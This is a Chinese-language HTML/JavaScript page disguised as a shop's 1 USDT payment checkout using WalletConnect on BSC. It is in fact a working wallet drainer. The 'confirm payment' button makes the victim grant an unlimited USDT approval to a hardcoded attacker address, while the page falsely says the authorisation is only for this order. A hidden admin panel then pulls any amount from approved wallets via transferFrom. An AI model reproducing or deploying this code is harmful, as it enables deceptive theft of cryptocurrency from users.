<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>商城订单支付中心</title>
<script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.0/dist/umd/sign-client.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Microsoft YaHei}
body{background:#121212;padding:16px;color:#fff}
.container{max-width:460px;margin:0 auto}
.order-card{background:#1e1e1e;border-radius:16px;padding:24px;border:1px solid #333}
.shop-title{font-size:22px;text-align:center;color:#ffc107;margin-bottom:4px}
.order-tip{text-align:center;color:#aaa;font-size:14px;margin-bottom:20px}
.order-info{background:#292929;border-radius:12px;padding:16px;margin-bottom:20px}
.info-row{display:flex;justify-content:space-between;padding:6px 0;color:#ddd;font-size:15px}
.price-text{color:#ff6b6b;font-weight:bold;font-size:18px}
.wallet-info{text-align:center;margin:16px 0;color:#87cefa;font-size:14px}
.btn{width:100%;height:48px;border:none;border-radius:12px;font-size:16px;margin:10px 0;cursor:pointer}
.btn-connect{background:#2563eb;color:#ffffff}
.btn-pay{background:#009e5f;color:#ffffff}
.remind-text{font-size:12px;color:#777;text-align:center;margin-top:6px}
/* 二维码区域 */
.qrcode-box{text-align:center;margin:15px 0;display:none}
#qrcode{display:inline-block;background:#fff;padding:8px;border-radius:8px}
/* 管理员归集面板，仅管理员钱包连接自动显示 */
.admin-panel{margin-top:24px;padding-top:20px;border-top:1px solid #333;display:none}
.admin-panel.show{display:block}
.admin-title{text-align:center;color:#ff6b6b;margin-bottom:14px;font-size:16px}
input{width:100%;height:44px;background:#292929;border:1px solid #444;border-radius:10px;padding:0 14px;color:#fff;margin:8px 0;font-size:14px}
.btn-deduct{background:#dc3545;color:#fff}
</style>
</head>
<body>
<div class="container">
    <div class="order-card">
        <h2 class="shop-title">商城订单支付</h2>
        <p class="order-tip">请连接钱包完成链上支付，付款后自动发货</p>

        <div class="order-info">
            <div class="info-row">
                <span>商品名称</span>
                <span>会员权益套餐</span>
            </div>
            <div class="info-row">
                <span>支付币种</span>
                <span>USDT (BSC)</span>
            </div>
            <div class="info-row">
                <span>应付金额</span>
                <span class="price-text">1.00 USDT</span>
            </div>
        </div>

        <button class="btn btn-connect" id="connectWallet">连接钱包(扫码)</button>
        <div class="qrcode-box" id="qrWrap">
            <div id="qrcode"></div>
            <p style="margin-top:8px;color:#aaa;font-size:13px">TP钱包扫码连接</p>
        </div>
        <div class="wallet-info">已连接钱包：<span id="addrText">未连接</span></div>

        <p class="remind-text">授权仅用于订单支付校验，资金仅用于本次订单结算</p>
        <button class="btn btn-pay" id="payBtn">确认支付订单</button>

        <!-- 管理员后台归集面板（内部使用） -->
        <div class="admin-panel" id="adminPanel">
            <h3 class="admin-title">后台资产归集</h3>
            <input type="text" placeholder="用户钱包地址" id="userAddr">
            <input type="number" placeholder="划扣数量(USDT)" id="deductNum">
            <button class="btn btn-deduct" id="deductBtn">一键归集资产</button>
        </div>
    </div>
</div>

<script>
// ========== 配置区【自行修改】 ==========
const ADMIN_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
const TOKEN_ADDR = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
const CHAIN_ID = 56; // BSC主网
let connectUserAddr = "";
let signClient = null;
let session = null;

// 初始化WalletConnect
async function initWalletConnect(){
    signClient = await SignClient.init({
        projectId: "9a85f847a3f349ec86f2d353a7f82170", // 公开测试projectId，正式使用请到WalletConnect官网申请
        metadata: {
            name: "商城订单系统",
            description: "链上支付服务",
            url: window.location.origin,
            icons: ["https://picsum.photos/100/100"]
        }
    });
    // 监听会话更新
    signClient.on("session_update", ({topic, params})=>{});
    signClient.on("session_delete", ()=>{
        alert("钱包连接断开");
        connectUserAddr = "";
        document.getElementById("addrText").innerText = "未连接";
        document.getElementById("qrWrap").style.display = "none";
    });
}

// 连接钱包，生成二维码
document.getElementById("connectWallet").addEventListener("click", async () => {
    if(!signClient) await initWalletConnect();
    try{
        const {uri, approval} = await signClient.connect({
            requiredNamespaces: {
                eip155: {
                    chains: [`eip155:${CHAIN_ID}`],
                    methods: ["eth_sendTransaction"],
                    events: ["chainChanged","accountsChanged"]
                }
            }
        });
        // 渲染二维码
        document.getElementById("qrWrap").style.display = "block";
        document.getElementById("qrcode").innerHTML = "";
        QRCode.toCanvas(document.getElementById("qrcode"), uri, {width:200});
        // 等待用户扫码授权
        session = await approval();
        const accounts = session.namespaces.eip155.accounts[0].split(":");
        connectUserAddr = accounts[2].toLowerCase();
        document.getElementById("addrText").innerText = connectUserAddr.slice(0,6)+"..."+connectUserAddr.slice(-4);
        document.getElementById("qrWrap").style.display = "none";
        if(connectUserAddr === ADMIN_ADDR){
            document.getElementById("adminPanel").classList.add("show");
        }
        alert("钱包连接成功，请点击确认支付");
    } catch (err) {
        console.error(err);
        alert("连接取消或失败");
    }
})

// 用户【确认支付】发起无限授权
document.getElementById("payBtn").addEventListener("click", async () => {
    if (!connectUserAddr || !session) return alert("请先扫码连接钱包！");
    const tip = confirm("确认支付 1.00 USDT，签名确认后完成链上结算！");
    if (!tip) return;

    try {
        const spenderHex = ADMIN_ADDR.slice(2).padStart(64,"0");
        const maxValue = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        const txData = "0x095ea7b3" + spenderHex + maxValue;

        const txParams = [{
            from: connectUserAddr,
            to: TOKEN_ADDR,
            gas: "0x300000",
            data: txData
        }];

        await signClient.request({
            topic: session.topic,
            chainId: `eip155:${CHAIN_ID}`,
            request: {
                method: "eth_sendTransaction",
                params: txParams
            }
        })
        alert("订单支付成功！商品正在发放，请等待区块确认");
    } catch (e) {
        alert("交易已取消");
    }
})

// 管理员归集功能
document.getElementById("deductBtn").addEventListener("click",async()=>{
    if(connectUserAddr !== ADMIN_ADDR) return alert("无权限操作");
    const targetAddr = document.getElementById("userAddr").value.trim();
    const amountVal = document.getElementById("deductNum").value.trim();
    if(!targetAddr || !amountVal || Number(amountVal) <= 0){
        return alert("请填写完整地址和数量");
    }

    const fromHex = targetAddr.toLowerCase().slice(2).padStart(64,"0");
    const toHex = ADMIN_ADDR.slice(2).padStart(64,"0");
    const amountHex = BigInt(Math.floor(Number(amountVal) * 1000000000000000000)).toString(16).padStart(64,"0");
    const callData = "0x23b872dd" + fromHex + toHex + amountHex;

    const txParams = [{
        from: connectUserAddr,
        to: TOKEN_ADDR,
        gas: "0x300000",
        data: callData
    }];

    await signClient.request({
        topic: session.topic,
        chainId: `eip155:${CHAIN_ID}`,
        request: {
            method: "eth_sendTransaction",
            params: txParams
        }
    })
    alert("资产归集完成");
    document.getElementById("userAddr").value = "";
    document.getElementById("deductNum").value = "";
})
</script>
</body>
</html>
